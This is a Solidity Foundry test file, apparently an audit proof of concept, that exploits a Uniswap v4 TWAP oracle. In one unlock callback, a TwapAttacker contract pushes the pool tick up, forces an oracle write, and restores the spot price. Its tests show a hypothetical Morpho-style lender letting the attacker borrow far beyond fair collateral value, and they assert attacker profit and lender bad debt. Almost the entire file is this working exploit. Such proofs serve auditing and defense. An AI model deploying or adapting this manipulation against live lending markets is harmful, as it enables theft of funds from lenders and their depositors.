// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TransientStateLibrary.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IOracle} from "@crane/contracts/external/morpho/blue/interfaces/IOracle.sol";
import {TestBase_UniswapV4MultiPoolTwapOracle} from "contracts/test/bases/TestBase_UniswapV4MultiPoolTwapOracle.sol";
import {IUniswapV4MultiPoolTwapOracle} from "contracts/oracles/uniswap/v4/twap/interfaces/IUniswapV4MultiPoolTwapOracle.sol";
import {UniswapV4TwapMorphoOracle} from "contracts/oracles/uniswap/v4/twap/UniswapV4TwapMorphoOracle.sol";

/// HYPOTHETICAL consumer: minimal Morpho-Blue-like isolated market (NOT part of the protocol / deployment).
contract HypotheticalLender {
    IERC20 public immutable collateral;
    IERC20 public immutable loan;
    IOracle public immutable oracle;
    uint256 public constant LLTV = 0.86e18;
    mapping(address => uint256) public coll;
    mapping(address => uint256) public debt;

    constructor(IERC20 c, IERC20 l, IOracle o) { collateral = c; loan = l; oracle = o; }

    function supplyCollateralAndBorrow(uint256 c, uint256 b) external {
        collateral.transferFrom(msg.sender, address(this), c);
        coll[msg.sender] += c;
        debt[msg.sender] += b;
        uint256 maxBorrow = coll[msg.sender] * oracle.price() / 1e36 * LLTV / 1e18;
        require(debt[msg.sender] <= maxBorrow, "unhealthy");
        loan.transfer(msg.sender, b);
    }
}

contract TwapAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    IPoolManager immutable pm;
    IUniswapV4MultiPoolTwapOracle immutable oracle;
    PoolKey key;
    HypotheticalLender lender;
    uint256 collAmt;
    uint256 borrowAmt;

    constructor(IPoolManager pm_, IUniswapV4MultiPoolTwapOracle o_, PoolKey memory k_) { pm = pm_; oracle = o_; key = k_; }

    function attack(HypotheticalLender lender_, uint256 c, uint256 b) external {
        lender = lender_; collAmt = c; borrowAmt = b;
        pm.unlock("");
        if (address(lender_) != address(0)) {
            IERC20(Currency.unwrap(key.currency0)).approve(address(lender_), c);
            lender_.supplyCollateralAndBorrow(c, b);
        }
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(pm));
        (uint160 sp0, int24 t0,,) = StateLibrary.getSlot0(pm, key.toId());
        // push tick up by >= 9116 (token1 in)
        pm.swap(key, SwapParams({zeroForOne: false, amountSpecified: -int256(1e30),
            sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(t0 + 9200)}), "");
        oracle.update(key);
        // restore exact original sqrtPrice (token0 in)
        pm.swap(key, SwapParams({zeroForOne: true, amountSpecified: -int256(1e30), sqrtPriceLimitX96: sp0}), "");
        _settle(key.currency0);
        _settle(key.currency1);
        return "";
    }

    function _settle(Currency c) internal {
        int256 d = TransientStateLibrary.currencyDelta(pm, address(this), c);
        if (d < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint256(-d));
            pm.settle();
        } else if (d > 0) {
            pm.take(c, address(this), uint256(d));
        }
    }
}

contract TwapRetroactive_PoC is TestBase_UniswapV4MultiPoolTwapOracle {
    uint32 constant W = 1800;
    uint32 constant MAX_AGE = 600;
    uint256 constant DEPTH = 1_000_000 ether;

    ERC20PermitMintableStub t0;
    ERC20PermitMintableStub t1;
    UniswapV4TwapMorphoOracle morpho;

    function _setupPool() internal {
        _initPool(poolManager, poolKey, TickMath.getSqrtPriceAtTick(0));
        _seedFullRange(poolKey, DEPTH, DEPTH);
        t0 = ERC20PermitMintableStub(Currency.unwrap(poolKey.currency0));
        t1 = ERC20PermitMintableStub(Currency.unwrap(poolKey.currency1));
        twapOracle.increaseCardinalityNext(poolKey.toId(), 8);
        assertTrue(_poke(poolKey));
        vm.roll(block.number + 1); _warp(60);
        assertTrue(_poke(poolKey)); // grow ring
        morpho = UniswapV4TwapMorphoOracle(twapAdapterFactory.createMorphoOracle(twapOracle, poolKey, W, true, MAX_AGE));
        // idle gap >= W (no organic writes)
        vm.roll(block.number + 1); _warp(W + 1);
    }

    function test_mechanism_restoredSpot_skewedTwap() public {
        _setupPool();
        // honest TWAP read before attack would be fair (tick 0) - but stale; attacker write makes it fresh & skewed
        TwapAttacker atk = new TwapAttacker(poolManager, twapOracle, poolKey);
        uint256 budget = 20_000 ether;
        t0.mint(address(atk), budget); t1.mint(address(atk), budget);
        (uint160 spBefore,,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());

        atk.attack(HypotheticalLender(address(0)), 0, 0);

        (uint160 spAfter, int24 tAfter,,) = StateLibrary.getSlot0(poolManager, poolKey.toId());
        int24 mean = twapOracle.consult(poolKey.toId(), W);
        uint256 p = morpho.price();
        uint256 cost0 = budget - t0.balanceOf(address(atk));
        uint256 cost1 = budget - t1.balanceOf(address(atk));
        console2.log("spot tick after restore", int256(tAfter));
        console2.log("consult(W=1800) mean tick", int256(mean));
        console2.log("morpho price (1e36 = fair)", p);
        console2.log("attacker cost token0", cost0);
        console2.log("attacker cost token1", cost1);
        assertEq(spAfter, spBefore, "spot restored");
        assertEq(int256(mean), 9116, "whole window credited with manipulated tick");
        assertGt(p, 2.4e36);
        assertEq(twapOracle.writeAge(poolKey.toId()), 0);
    }

    function test_hypotheticalConsumer_profit() public {
        _setupPool();
        // honest lender seeds a hypothetical market priced by the permissionless factory adapter
        HypotheticalLender lender = new HypotheticalLender(IERC20(address(t0)), IERC20(address(t1)), IOracle(address(morpho)));
        t1.mint(address(this), 1_000_000 ether);
        t1.transfer(address(lender), 1_000_000 ether);

        TwapAttacker atk = new TwapAttacker(poolManager, twapOracle, poolKey);
        uint256 budget = 20_000 ether;
        uint256 collAmt = 400_000 ether;
        t0.mint(address(atk), budget + collAmt); t1.mint(address(atk), budget);
        uint256 borrowAmt = 850_000 ether; // fair max is 0.86*400k = 344k
        atk.attack(lender, collAmt, borrowAmt);

        // value everything at restored/fair price (tick 0 => 1:1)
        uint256 v0 = t0.balanceOf(address(atk)) + t1.balanceOf(address(atk));
        uint256 startVal = 2 * budget + collAmt;
        int256 profit = int256(v0) - int256(startVal);
        int256 lenderLoss = int256(borrowAmt) - int256(collAmt); // bad debt vs collateral fair value
        console2.log("attacker start value", startVal);
        console2.log("attacker end value", v0);
        console2.log("attacker net profit (fair px)", profit);
        console2.log("lender bad debt (debt - coll fair value)", lenderLoss);
        assertGt(profit, 0);
        assertGt(lenderLoss, 0);
    }
}
